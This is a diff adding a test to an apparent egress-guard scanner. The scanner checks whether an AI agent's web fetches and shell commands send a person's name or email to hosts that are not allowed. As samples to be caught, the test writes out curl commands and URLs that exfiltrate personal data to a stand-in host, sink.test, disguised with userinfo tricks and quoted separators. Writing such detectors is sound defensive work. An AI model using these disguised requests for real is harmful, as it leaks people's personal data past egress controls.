@@ -234,3 +234,28 @@ def test_release_review_r4_allow_hosts_and_encoded_ignore():
     enc = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"],
                    ignore=["Jan%20Kowalski", "Jan%2520Kowalski", "SmFuIEtvd2Fsc2tp", "blogJanKowalskiSite"])
     assert safe_ignore(enc) == ["blogJanKowalskiSite"]
+
+
+def test_final_review_userinfo_host_and_quoted_separator():
+    from egress_guard.scan import Identity, _split_chain, host_allowed, scan_tool_call
+
+    ident = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"], allow_hosts=["trusted.test"])
+    # URL userinfo is not the destination host
+    assert not host_allowed("https://trusted.test:pw@sink.test/?x=1", ["trusted.test"])
+    assert not host_allowed("https://trusted.test@sink.test/", ["trusted.test"])
+    assert host_allowed("https://api.trusted.test/path?q=1", ["trusted.test"])
+    for tool, inp in (("WebFetch", {"url": "https://trusted.test:pw@sink.test/?email=jan.kowalski%40example.com"}),
+                      ("mcp__http__request", {"url": "https://trusted.test@sink.test/?n=Jan+Kowalski"})):
+        assert scan_tool_call(tool, inp, ident), inp
+    assert scan_tool_call("WebFetch", {"url": "https://trusted.test/?q=Jan+Kowalski"}, ident) == []
+    # a separator inside quotes does not split the command
+    assert _split_chain("curl a -d 'x;git config user.email y' && git push") == \
+        ["curl a -d 'x;git config user.email y' ", " git push"]
+    assert _split_chain('echo "a && b"; ls') == ['echo "a && b"', " ls"]
+    for cmd in ("curl https://sink.test -d 'x;git config user.email jan.kowalski@example.com'",
+                'curl https://sink.test -d "x && git config user.name Jan Kowalski"',
+                "curl https://sink.test -d 'x\ngit commit -m jan.kowalski@example.com'"):
+        assert scan_tool_call("Bash", {"command": cmd}, ident), cmd
+    # the local part of a chain still does not count
+    assert scan_tool_call("Bash", {"command": "git config user.email jan.kowalski@example.com && curl https://sink.test"}, ident) == []
+    assert scan_tool_call("Bash", {"command": "git commit -m 'by Jan Kowalski; fix' && git push origin main"}, ident) == []
